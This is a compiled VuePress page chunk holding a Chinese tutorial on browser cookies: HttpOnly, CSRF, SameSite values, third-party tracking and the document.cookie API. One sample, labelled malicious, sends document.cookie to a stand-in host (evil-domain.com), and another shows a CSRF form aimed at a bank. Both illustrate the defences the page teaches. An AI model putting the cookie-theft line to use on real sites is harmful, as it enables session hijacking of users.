"),e("code",[this._v("Cookie")]),this._v("。")])},function(){var t=this,e=t.$createElement,s=t._self._c||e;return s("div",{staticClass:"language-js extra-class"},[s("pre",{pre:!0,attrs:{class:"language-js"}},[s("code",[s("span",{attrs:{class:"token comment"}},[t._v("// 跨站点载入一个恶意脚本，能够将当前网页的 Cookie 发往第三方服务器")]),t._v("\n"),s("span",{attrs:{class:"token punctuation"}},[t._v("(")]),s("span",{attrs:{class:"token keyword"}},[t._v("new")]),t._v(" "),s("span",{attrs:{class:"token class-name"}},[t._v("Image")]),s("span",{attrs:{class:"token punctuation"}},[t._v("(")]),s("span",{attrs:{class:"token punctuation"}},[t._v(")")]),s("span",{attrs:{class:"token punctuation"}},[t._v(")")]),s("span",{attrs:{class:"token punctuation"}},[t._v(".")]),t._v("src "),s("span",{attrs:{class:"token operator"}},[t._v("=")]),t._v(" "),s("span",{attrs:{class:"token string"}},[t._v('"http://www.evil-domain.com/steal-cookie.php?cookie="')]),t._v(" "),s("span",{attrs:{class:"token operator"}},[t._v("+")]),t._v(" document"),s("span",{attrs:{class:"token punctuation"}},[t._v(".")]),t._v("cookie"),s("span",{attrs:{class:"token punctuation"}},[t._v(";")]),t._v("\n")])])])},function(){var t=this.$createElement,e=this._self._c||t;return e("h3",{attrs:{id:"_3-4-samesite"}},[e("a",{staticClass:"header-anchor",attrs:{href:"#_3-4-samesite","aria-hidden":"true"}},[this._v("#")]),this._v(" 3.4 SameSite")])},function(){var t=this,e=t.$createElement,s=t._self._c||e;return s("p",[s("code",[t._v("Chrome 51")]),t._v(" 开始，浏览器的 "),s("code",[t._v("Cookie")]),t._v(" 新增加了一个"),s("code",[t._v("SameSite")]),t._v("属性，用来防止 "),s("code",[t._v("CSRF")]),t._v(" 攻击和用户追踪。")])},function(){var t=this,e=t.$createElement,s=t._self._c||e;return s("ul",[s("li",[s("strong",[s("code",[t._v("CSRF")]),t._v("跨站请求伪造(cross-site request forgery)")]),t._v("："),s("code",[t._v("Cookie")]),t._v("往往用来存储用户的身份信息，恶意网站可以设法伪造带有正确 "),s("code",[t._v("Cookie")]),t._v(" 的 "),s("code",[t._v("HTTP")]),t._v(" 请求，这就是 "),s("strong",[t._v("CSRF 攻击")]),t._v("。")])])},function(){var t=this.$createElement,e=this._self._c||t;return e("p",[this._v("举例来说，用户登陆了银行网站"),e("code",[this._v("your-bank.com")]),this._v("，银行服务器发来了一个 "),e("code",[this._v("Cookie")]),this._v("。用户后来又访问了恶意网站"),e("code",[this._v("malicious.com")]),this._v("，上面有一个表单。")])},function(){var t=this,e=t.$createElement,s=t._self._c||e;return s("div",{staticClass:"language-html extra-class"},[s("pre",{pre:!0,attrs:{class:"language-html"}},[s("code",[s("span",{attrs:{class:"token tag"}},[s("span",{attrs:{class:"token tag"}},[s("span",{attrs:{class:"token punctuation"}},[t._v("<")]),t._v("form")]),t._v(" "),s("span",{attrs:{class:"token attr-name"}},[t._v("action")]),s("span",{attrs:{class:"token attr-value"}},[s("span",{attrs:{class:"token punctuation"}},[t._v("=")]),s("span",{attrs:{class:"token punctuation"}},[t._v('"')]),t._v("your-bank.com/transfer"),s("span",{attrs:{class:"token punctuation"}},[t._v('"')])]),t._v(" "),s("span",{attrs:{class:"token attr-name"}},[t._v("method")]),s("span",{attrs:{class:"token attr-value"}},[s("span",{attrs:{class:"token punctuation"}},[t._v("=")]),s("span",{attrs:{class:"token punctuation"}},[t._v('"')]),t._v("POST"),s("span",{attrs:{class:"token punctuation"}},[t._v('"')])]),s("span",{attrs:{class:"token punctuation"}},[t._v(">")])]),t._v("\n  ...\n"),s("span",{attrs:{class:"token tag"}},[s("span",{attrs:{class:"token tag"}},[s("span",{attrs:{class:"token punctuation"}},[t._v("</")]),t._v("form")]),s("span",{attrs:{class:"token punctuation"}},[t._v(">")])]),t._v("\n")])])])},function(){var t=this.$createElement,e=this._self._c||t;return e("p",[this._v("用户一旦被诱骗发送这个表单，银行网站就会收到带有正确 "),e("code",[this._v("Cookie")]),this._v(" 的请求。为了防止这种攻击，表单一般都带有一个随机 "),e("code",[this._v("token")]),this._v("，告诉服务器这是真实请求。")])},function(){var t=this,e=t.$createElement,s=t._self._c||e;return s("div",{staticClass:"language-js extra-class"},[s("pre",{pre:!0,attrs:{class:"language-js"}},[s("code",[s("span",{attrs:{class:"token operator"}},[t._v("<")]),t._v("form action"),s("span",{attrs:{class:"token operator"}},[t._v("=")]),s("span",{attrs:{class:"token string"}},[t._v('"your-bank.com/transfer"')]),t._v(" method"),s("span",{attrs:{class:"token operator"}},[t._v("=")]),s("span",{attrs:{class:"token string"}},[t._v('"POST"')]),s("span",{attrs:{class:"token operator"}},[t._v(">")]),t._v("\n  "),s("span",{attrs:{class:"token operator"}},[t._v("<")]),t._v("input type"),s("span",{attrs:{class:"token operator"}},[t._v("=")]),s("span",{attrs:{class:"token string"}},[t._v('"hidden"')]),t._v(" name"),s("span",{attrs:{class:"token operator"}},[t._v("=")]),s("span",{attrs:{class:"token string"}},[t._v('"token"')]),t._v(" value"),s("span",{attrs:{class:"token operator"}},[t._v("=")]),s("span",{attrs:{class:"token string"}},[t._v('"dad3weg34"')]),s("span",{attrs:{class:"token operator"}},[t._v(">")]),t._v("\n  "),s("span",{attrs:{class:"token operator"}},[t._v("...")]),t._v("\n"),s("span",{attrs:{class:"token operator"}},[t._v("<")]),s("span",{attrs:{class:"token operator"}},[t._v("/")]),t._v("form"),s("span",{attrs:{class:"token operator"}},[t._v(">")]),t._v("\n")])])])},function(){var t=this.$createElement,e=this._self._c||t;return e("h4",{attrs:{id:"第三方cookie"}},[e("a",{staticClass:"header-anchor",attrs:{href:"#第三方cookie","aria-hidden":"true"}},[this._v("#")]),this._v(" 第三方cookie")])},function(){var t=this,e=t.$createElement,s=t._self._c||e;return s("p",[t._v("第三方网站引导发出的 "),s("code",[t._v("Cookie")]),t._v("，就称为第三方 "),s("code",[t._v("Cookie")]),t._v("。它除了用于 "),s("code",[t._v("CSRF")]),t._v(" 攻击，还可以用于用户追踪。比如，"),s("code",[t._v("Facebook")]),t._v(" 在第三方网站插入一张看不见的图片。")])},function(){var t=this,e=t.$createElement,s=t._self._c||e;return s("div",{staticClass:"language-js extra-class"},[s("pre",{pre:!0,attrs:{class:"language-js"}},[s("code",[s("span",{attrs:{class:"token comment"}},[t._v("// 浏览器加载上面代码时，就会向 Facebook 发出带有 Cookie 的请求，")]),t._v("\n"),s("span",{attrs:{class:"token comment"}},[t._v("// 从而 Facebook 就会知道你是谁，访问了什么网站。")]),t._v("\n"),s("span",{attrs:{class:"token operator"}},[t._v("<")]),t._v("img src"),s("span",{attrs:{class:"token operator"}},[t._v("=")]),s("span",{attrs:{class:"token string"}},[t._v('"facebook.com"')]),t._v(" style"),s("span",{attrs:{class:"token operator"}},[t._v("=")]),s("span",{attrs:{class:"token string"}},[t._v('"visibility:hidden;"')]),s("span",{attrs:{class:"token operator"}},[t._v(">")]),t._v("\n")])])])},function(){var t=this.$createElement,e=this._self._c||t;return e("h4",{attrs:{id:"samesite属性的三个值"}},[e("a",{staticClass:"header-anchor",attrs:{href:"#samesite属性的三个值","aria-hidden":"true"}},[this._v("#")]),this._v(" SameSite属性的三个值")])},function(){var t=this.$createElement,e=this._self._c||t;return e("p",[e("code",[this._v("Cookie")]),this._v(" 的"),e("code",[this._v("SameSite")]),this._v("属性用来限制第三方 "),e("code",[this._v("Cookie")]),this._v("，从而减少安全风险。它可以设置三个值。")])},function(){var t=this,e=t.$createElement,s=t._self._c||e;return s("ul",[s("li",[s("strong",[t._v("Strict")]),s("code",[t._v("Strict")]),t._v("最为严格，完全禁止第三方 "),s("code",[t._v("Cookie")]),t._v("，跨站点时，任何情况下都不会发送 "),s("code",[t._v("Cookie")]),t._v("。换言之，只有当前网页的 "),s("code",[t._v("URL")]),t._v(" 与请求目标一致，才会带上 "),s("code",[t._v("Cookie")]),t._v("。")])])},function(){var t=this.$createElement,e=this._self._c||t;return e("div",{staticClass:"language-json extra-class"},[e("pre",{pre:!0,attrs:{class:"language-json"}},[e("code",[this._v("// 这个规则过于严格，可能造成非常不好的用户体验。\nSet-Cookie"),e("span",{attrs:{class:"token operator"}},[this._v(":")]),this._v(" CookieName=CookieValue"),e("span",{attrs:{class:"token punctuation"}},[this._v(";")]),this._v(" SameSite=Strict"),e("span",{attrs:{class:"token punctuation"}},[this._v(";")]),this._v("\n")])])])},function(){var t=this.$createElement,e=this._self._c||t;return e("p",[this._v("比如，当前网页有一个 "),e("code",[this._v("GitHub")]),this._v(" 链接，用户点击跳转就不会带有 "),e("code",[this._v("GitHub")]),this._v(" 的 "),e("code",[this._v("Cookie")]),this._v("，跳转过去总是未登陆状态。")])},function(){var t=this.$createElement,e=this._self._c||t;return e("ul",[e("li",[e("strong",[this._v("Lax")])])])},function(){var t=this.$createElement,e=this._self._c||t;return e("p",[e("code",[this._v("Lax")]),this._v("规则稍稍放宽，大多数情况也是不发送第三方 "),e("code",[this._v("Cookie")]),this._v("，但是导航到目标网址的 "),e("code",[this._v("Get")]),this._v(" 请求除外。")])},function(){var t=this.$createElement,e=this._self._c||t;return e("div",{staticClass:"language-json extra-class"},[e("pre",{pre:!0,attrs:{class:"language-json"}},[e("code",[this._v("Set-Cookie"),e("span",{attrs:{class:"token operator"}},[this._v(":")]),this._v(" CookieName=CookieValue"),e("span",{attrs:{class:"token punctuation"}},[this._v(";")]),this._v(" SameSite=Lax"),e("span",{attrs:{class:"token punctuation"}},[this._v(";")]),this._v("\n")])])])},function(){var t=this.$createElement,e=this._self._c||t;return e("p",[this._v("导航到目标网址的 "),e("code",[this._v("GET")]),this._v(" 请求，只包括三种情况：链接，预加载请求，GET 表单。详见下表。")])},function(){var t=this,e=t.$createElement,s=t._self._c||e;return s("table",[s("thead",[s("tr",[s("th",[t._v("请求类型")]),s("th",[t._v("示例")]),s("th",[t._v("正常情况")]),s("th",[t._v("Lax")])])]),s("tbody",[s("tr",[s("td",[t._v("链接")]),s("td",[s("code",[t._v('<a href="..."></a>')])]),s("td",[t._v("发送 "),s("code",[t._v("Cookie")])]),s("td",[t._v("发送 "),s("code",[t._v("Cookie")])])]),s("tr",[s("td",[t._v("预加载")]),s("td",[s("code",[t._v('<link rel="prerender" href="..."/>')])]),s("td",[t._v("发送 "),s("code",[t._v("Cookie")])]),s("td",[t._v("发送 "),s("code",[t._v("Cookie")])])]),s("tr",[s("td",[s("code",[t._v("GET")]),t._v(" 表单")]),s("td",[s("code",[t._v('<form method="GET" action="...">')])]),s("td",[t._v("发送 "),s("code",[t._v("Cookie")])]),s("td",[t._v("发送 "),s("code",[t._v("Cookie")])])]),s("tr",[s("td",[s("code",[t._v("POST")]),t._v(" 表单")]),s("td",[s("code",[t._v('<form method="POST" action="...">')])]),s("td",[t._v("发送 "),s("code",[t._v("Cookie")])]),s("td",[t._v("不发送")])]),s("tr",[s("td",[s("code",[t._v("iframe")])]),s("td",[s("code",[t._v('<iframe src="..."></iframe>')])]),s("td",[t._v("发送 "),s("code",[t._v("Cookie")])]),s("td",[t._v("不发送")])]),s("tr",[s("td",[s("code",[t._v("AJAX")])]),s("td",[s("code",[t._v('$.get("...")')])]),s("td",[t._v("发送 "),s("code",[t._v("Cookie")])]),s("td",[t._v("不发送")])]),s("tr",[s("td",[s("code",[t._v("Image")])]),s("td",[s("code",[t._v('<img src="...">')])]),s("td",[t._v("发送 "),s("code",[t._v("Cookie")])]),s("td",[t._v("不发送")])])])])},function(){var t=this,e=t.$createElement,s=t._self._c||e;return s("p",[t._v("设置了"),s("code",[t._v("Strict")]),t._v("或"),s("code",[t._v("Lax")]),t._v("以后，基本就杜绝了 "),s("code",[t._v("CSRF")]),t._v(" 攻击。当然，前提是用户浏览器支持 "),s("code",[t._v("SameSite")]),t._v(" 属性。")])},function(){var t=this.$createElement,e=this._self._c||t;return e("ul",[e("li",[e("strong",[this._v("None")])])])},function(){var t=this,e=t.$createElement,s=t._self._c||e;return s("p",[s("code",[t._v("Chrome")]),t._v(" 计划将"),s("code",[t._v("Lax")]),t._v("变为默认设置。这时，网站可以选择显式关闭"),s("code",[t._v("SameSite")]),t._v("属性，将其设为"),s("code",[t._v("None")]),t._v("。不过，前提是必须同时设置"),s("code",[t._v("Secure")]),t._v("属性（"),s("code",[t._v("Cookie")]),t._v(" 只能通过 "),s("code",[t._v("HTTPS")]),t._v(" 协议发送），否则无效。")])},function(){var t=this,e=t.$createElement,s=t._self._c||e;return s("div",{staticClass:"language-json extra-class"},[s("pre",{pre:!0,attrs:{class:"language-json"}},[s("code",[t._v("// 下面的设置无效。\nSet-Cookie"),s("span",{attrs:{class:"token operator"}},[t._v(":")]),t._v(" widget_session=abc123"),s("span",{attrs:{class:"token punctuation"}},[t._v(";")]),t._v(" SameSite=None\n\n// 下面的设置有效。\nSet-Cookie"),s("span",{attrs:{class:"token operator"}},[t._v(":")]),t._v(" widget_session=abc123"),s("span",{attrs:{class:"token punctuation"}},[t._v(";")]),t._v(" SameSite=None"),s("span",{attrs:{class:"token punctuation"}},[t._v(";")]),t._v(" Secure\n")])])])},function(){var t=this.$createElement,e=this._self._c||t;return e("h2",{attrs:{id:"_4、document-cookie-可读写"}},[e("a",{staticClass:"header-anchor",attrs:{href:"#_4、document-cookie-可读写","aria-hidden":"true"}},[this._v("#")]),this._v(" 4、document.cookie - 可读写")])},function(){var t=this,e=t.$createElement,s=t._self._c||e;return s("p",[s("code",[t._v("document.cookie")]),t._v("属性用于读写当前网页的 "),s("code",[t._v("Cookie")]),t._v("，前提是该 "),s("code",[t._v("Cookie")]),t._v(" 不能有"),s("code",[t._v("HttpOnly")]),t._v("属性。")])},function(){var t=this,e=t.$createElement,s=t._self._c||e;return s("div",{staticClass:"language-js extra-class"},[s("pre",{pre:!0,attrs:{class:"language-js"}},[s("code",[s("span",{attrs:{class:"token comment"}},[t._v("// 服务端设置cookie")]),t._v("\nrouter"),s("span",{attrs:{class:"token punctuation"}},[t._v(".")]),s("span",{attrs:{class:"token keyword"}},[t._v("get")]),s("span",{attrs:{class:"token punctuation"}},[t._v("(")]),s("span",{attrs:{class:"token string"}},[t._v("'/detail'")]),s("span",{attrs:{class:"token punctuation"}},[t._v(",")]),t._v(" "),s("span",{attrs:{class:"token keyword"}},[t._v("async")]),t._v(" ctx "),s("span",{attrs:{class:"token operator"}},[t._v("=>")]),t._v(" "),s("span",{attrs:{class:"token punctuation"}},[t._v("{")]),t._v("\n  "),s("span",{attrs:{class:"token comment"}},[t._v("// ctx.set('Set-Cookie', 'key1=888; path=/detail;')")]),t._v("\n  ctx"),s("span",{attrs:{class:"token punctuation"}},[t._v(".")]),s("span",{attrs:{class:"token keyword"}},[t._v("set")]),s("span",{attrs:{class:"token punctuation"}},[t._v("(")]),s("span",{attrs:{class:"token string"}},[t._v("'Set-Cookie'")]),s("span",{attrs:{class:"token punctuation"}},[t._v(",")]),t._v(" "),s("span",{attrs:{class:"token string"}},[t._v("'key2=999; path=/;'")]),s("span",{attrs:{class:"token punctuation"}},[t._v(")")]),t._v("\n  "),s("span",{attrs:{class:"token comment"}},[t._v("// ctx.set('Set-Cookie', 'key1=888; path=/detail;HttpOnly') // 无法通过脚本拿到")]),t._v("\n  "),s("span",{attrs:{class:"token keyword"}},[t._v("await")]),t._v(" ctx"),s("span",{attrs:{class:"token punctuation"}},[t._v(".")]),s("span",{attrs:{class:"token function"}},[t._v("render")]),s("span",{attrs:{class:"token punctuation"}},[t._v("(")]),s("span",{attrs:{class:"token string"}},[t._v("'detail'")]),s("span",{attrs:{class:"token punctuation"}},[t._v(")")]),t._v("\n"),s("span",{attrs:{class:"token punctuation"}},[t._v("}")]),s("span",{attrs:{class:"token punctuation"}},[t._v(")")]),t._v("\n")])])])},function(){var t=this,e=t.$createElement,s=t._self._c||e;return s("div",{staticClass:"language-js extra-class"},[s("pre",{pre:!0,attrs:{class:"language-js"}},[s("code",[s("span",{attrs:{class:"token comment"}},[t._v("// 客户端 - 获取cookie")]),t._v("\n"),s("span",{attrs:{class:"token comment"}},[t._v("// 一次性读出两个 Cookie, 必须手动还原，才能取出每一个 Cookie 的值。")]),t._v("\n"),s("span",{attrs:{class:"token comment"}},[t._v('// document.cookie // "key1=888; key2=999"')]),t._v("\n"),s("span",{attrs:{class:"token keyword"}},[t._v("let")]),t._v(" cookies "),s("span",{attrs:{class:"token operator"}},[t._v("=")]),t._v(" document"),s("span",{attrs:{class:"token punctuation"}},[t._v(".")]),t._v("cookie"),s("span",{attrs:{class:"token punctuation"}},[t._v(".")]),s("span",{attrs:{class:"token function"}},[t._v("split")]),s("span",{attrs:{class:"token punctuation"}},[t._v("(")]),s("span",{attrs:{class:"token string"}},[t._v("';'")]),s("span",{attrs:{class:"token punctuation"}},[t._v(")")]),t._v("\ncookies"),s("span",{attrs:{class:"token punctuation"}},[t._v(".")]),s("span",{attrs:{class:"token function"}},[t._v("forEach")]),s("span",{attrs:{class:"token punctuation"}},[t._v("(")]),t._v("cookie "),s("span",{attrs:{class:"token operator"}},[t._v("=>")]),t._v(" "),s("span",{attrs:{class:"token punctuation"}},[t._v("{")]),t._v("\n  "),s("span",{attrs:{class:"token keyword"}},[t._v("let")]),t._v(" kv "),s("span",{attrs:{class:"token operator"}},[t._v("=")]),t._v(" cookie"),s("span",{attrs:{class:"token punctuation"}},[t._v(".")]),s("span",{attrs:{class:"token function"}},[t._v("split")]),s("span",{attrs:{class:"token punctuation"}},[t._v("(")]),s("span",{attrs:{class:"token string"}},[t._v("'='")]),s("span",{attrs:{class:"token punctuation"}},[t._v(")")]),t._v("\n  console"),s("span",{attrs:{class:"token punctuation"}},[t._v(".")]),s("span",{attrs:{class:"token function"}},[t._v("log")]),s("span",{attrs:{class:"token punctuation"}},[t._v("(")]),t._v("kv"),s("span",{attrs:{class:"token punctuation"}},[t._v("[")]),s("span",{attrs:{class:"token number"}},[t._v("0")]),s("span",{attrs:{class:"token punctuation"}},[t._v("]")]),s("span",{attrs:{class:"token punctuation"}},[t._v(",")]),t._v(" kv"),s("span",{attrs:{class:"token punctuation"}},[t._v("[")]),s("span",{attrs:{class:"token number"}},[t._v("1")]),s("span",{attrs:{class:"token punctuation"}},[t._v("]")]),s("span",{attrs:{class:"token punctuation"}},[t._v(")")]),t._v("\n"),s("span",{attrs:{class:"token punctuation"}},[t._v("}")]),s("span",{attrs:{class:"token punctuation"}},[t._v(")")]),t._v("\n")])])])},function(){var t=this.$createElement,e=this._self._c||t;return e("h3",{attrs:{id:"添加cookie-一次只能添加一个"}},[e("a",{staticClass:"header-anchor",attrs:{href:"#添加cookie-一次只能添加一个","aria-hidden":"true"}},[this._v("#")]),this._v(" 添加cookie - 一次只能添加一个")])},function(){var t=this.$createElement,e=this._self._c||t;return e("p",[e("code",[this._v("document.cookie")]),this._v("属性是可写的，可以通过它为当前网站添加 "),e("code",[this._v("Cookie")]),this._v("。")])},function(){var t=this,e=t.$createElement,s=t._self._c||e;return s("ul",[s("li",[t._v("写入时，"),s("code",[t._v("Cookie")]),t._v(" 的值必须写成"),s("code",[t._v("key=value")]),t._v("的形式，等号两边不能有空格。")]),s("li",[t._v("必须对分号、逗号和空格进行转义（它们都不允许作为 "),s("code",[t._v("Cookie")]),t._v(" 的值），这可以用"),s("code",[t._v("encodeURIComponent")]),t._v("方法达到。")]),s("li",[s("code",[t._v("document.cookie")]),t._v("一次只能写入一个 "),s("code",[t._v("Cookie")]),t._v("，而且写入并不是覆盖，而是添加。")]),s("li",[t._v("写入 Cookie 的时候，可以一起写入 "),s("code",[t._v("Cookie")]),t._v(" 的属性。")])])},function(){var t=this,e=t.$createElement,s=t._self._c||e;return s("div",{staticClass:"language-js extra-class"},[s("pre",{pre:!0,attrs:{class:"language-js"}},[s("code",[t._v("document"),s("span",{attrs:{class:"token punctuation"}},[t._v(".")]),t._v("cookie "),s("span",{attrs:{class:"token operator"}},[t._v("=")]),t._v(" "),s("span",{attrs:{class:"token string"}},[t._v("'name1=zy1'")]),t._v("\ndocument"),s("span",{attrs:{class:"token punctuation"}},[t._v(".")]),t._v("cookie "),s("span",{attrs:{class:"token operator"}},[t._v("=")]),t._v(" "),s("span",{attrs:{class:"token string"}},[t._v("'name2=zy2'")]),t._v("\n"),s("span",{attrs:{class:"token comment"}},[t._v("// 写入 Cookie 的时候，同时设置了expires属性")]),t._v("\ndocument"),s("span",{attrs:{class:"token punctuation"}},[t._v(".")]),t._v("cookie "),s("span",{attrs:{class:"token operator"}},[t._v("=")]),t._v(" "),s("span",{attrs:{class:"token string"}},[t._v("'name3=zy3;expires=Fri,16 Apri 2021 14:53:00'")]),t._v("\ndocument"),s("span",{attrs:{class:"token punctuation"}},[t._v(".")]),t._v("cookie "),s("span",{attrs:{class:"token comment"}},[t._v('// "name1=zy1; name2=zy2; name3=zy3"')]),t._v("\n")])])])},function(){var t=this,e=t.$createElement,s=t._self._c||e;return s("ul",[s("li",[s("code",[t._v("path")]),t._v("属性必须为绝对路径，默认为当前路径。")]),s("li",[s("code",[t._v("domain")]),t._v("属性值必须是当前发送 "),s("code",[t._v("Cookie")]),t._v(" 的域名的一部分。\n"),s("ul",[s("li",[t._v("比如，当前域名是"),s("code",[t._v("example.com")]),t._v("，就不能将其设为"),s("code",[t._v("foo.com")]),t._v("。该属性默认为当前的一级域名（不含二级域名）。")])])]),s("li",[s("code",[t._v("max-age")]),t._v("属性的值为秒数。")]),s("li",[s("code",[t._v("expires")]),t._v("属性的值为 "),s("code",[t._v("UTC")]),t._v(" 格式，可以使用"),s("code",[t._v("Date.prototype.toUTCString()")]),t._v("进行日期格式转换。")])])},function(){var t=this,e=t.$createElement,s=t._self._c||e;return s("div",{staticClass:"language-js extra-class"},[s("pre",{pre:!0,attrs:{class:"language-js"}},[s("code",[s("span",{attrs:{class:"token comment"}},[t._v("// document.cookie写入 Cookie ")]),t._v("\n"),s("span",{attrs:{class:"token comment"}},[t._v("// Cookie 的属性一旦设置完成，就没有办法读取这些属性的值。")]),t._v("\ndocument"),s("span",{attrs:{class:"token punctuation"}},[t._v(".")]),t._v("cookie "),s("span",{attrs:{class:"token operator"}},[t._v("=")]),t._v(" "),s("span",{attrs:{class:"token string"}},[t._v("'fontSize=14; '")]),t._v("\n  "),s("span",{attrs:{class:"token operator"}},[t._v("+")]),t._v(" "),s("span",{attrs:{class:"token string"}},[t._v("'expires='")]),t._v(" "),s("span",{attrs:{class:"token operator"}},[t._v("+")]),t._v(" someDate"),s("span",{attrs:{class:"token punctuation"}},[t._v(".")]),s("span",{attrs:{class:"token function"}},[t._v("toGMTString")]),s("span",{attrs:{class:"token punctuation"}},[t._v("(")]),s("span",{attrs:{class:"token punctuation"}},[t._v(")")]),t._v(" "),s("span",{attrs:{class:"token operator"}},[t._v("+")]),t._v(" "),s("span",{attrs:{class:"token string"}},[t._v("'; '")]),t._v("\n  "),s("span",{attrs:{class:"token operator"}},[t._v("+")]),t._v(" "),s("span",{attrs:{class:"token string"}},[t._v("'path=/subdirectory; '")]),t._v("\n  "),s("span",{attrs:{class:"token operator"}},[t._v("+")]),t._v(" "),s("span",{attrs:{class:"token string"}},[t._v("'domain=*.example.com'")]),s("span",{attrs:{class:"token punctuation"}},[t._v(";")]),t._v("\n")])])])},function(){var t=this,e=t.$createElement,s=t._self._c||e;return s("p",[s("code",[t._v("document.cookie")]),t._v("读写行为的差异（一次可以读出全部 "),s("code",[t._v("Cookie")]),t._v("，但是只能写入一个 "),s("code",[t._v("Cookie")]),t._v("），与 "),s("code",[t._v("HTTP")]),t._v(" 协议的 "),s("code",[t._v("Cookie")]),t._v(" 通信格式有关。")])},function(){var t=this,e=t.$createElement,s=t._self._c||e;return s("ul",[s("li",[t._v("浏览器向服务器发送 "),s("code",[t._v("Cookie")]),t._v(" 的时候，"),s("code",[t._v("Cookie")]),t._v("字段是使用一行字符串，将所有 "),s("code",[t._v("Cookie")]),t._v(" 全部发送；")]),s("li",[t._v("服务器向浏览器设置 "),s("code",[t._v("Cookie")]),t._v(" 的时候，"),s("code",[t._v("Set-Cookie")]),t._v("字段是一行设置一个 "),s("code",[t._v("Cookie")]),t._v("。")])])},function(){var t=this.$createElement,e=this._self._c||t;return e("p",[e("strong",[this._v("删除一个现存 Cookie 的唯一方法，是设置它的 expires 属性为一个过去的日期。")])])},function(){var t=this,e=t.$createElement,s=t._self._c||e;return s("div",{staticClass:"language-js extra-class"},[s("pre",{pre:!0,attrs:{class:"language-js"}},[s("code",[s("span",{attrs:{class:"token comment"}},[t._v("// 名为fontSize的 Cookie 的值为空，过期时间设为1970年1月1月零点，就等同于删除了这个 Cookie。")]),t._v("\ndocument"),s("span",{attrs:{class:"token punctuation"}},[t._v(".")]),t._v("cookie "),s("span",{attrs:{class:"token operator"}},[t._v("=")]),t._v(" "),s("span",{attrs:{class:"token string"}},[t._v("'fontSize=;expires=Thu, 01-Jan-1970 00:00:01 GMT'")]),s("span",{attrs:{class:"token punctuation"}},[t._v(";")]),t._v("\n")])])])},function(){var t=this.$createElement,e=this._self._c||t;return e("h3",{attrs:{id:"_5、参考链接"}},[e("a",{staticClass:"header-anchor",attrs:{href:"#_5、参考链接","aria-hidden":"true"}},[this._v("#")]),this._v(" 5、参考链接")])},function(){var t=this.$createElement,e=this._self._c||t;return e("li",[e("a",{attrs:{href:""}},[this._v("SameSite cookies explained")])])}],!1,null,null,null);e.default=n.exports}}]);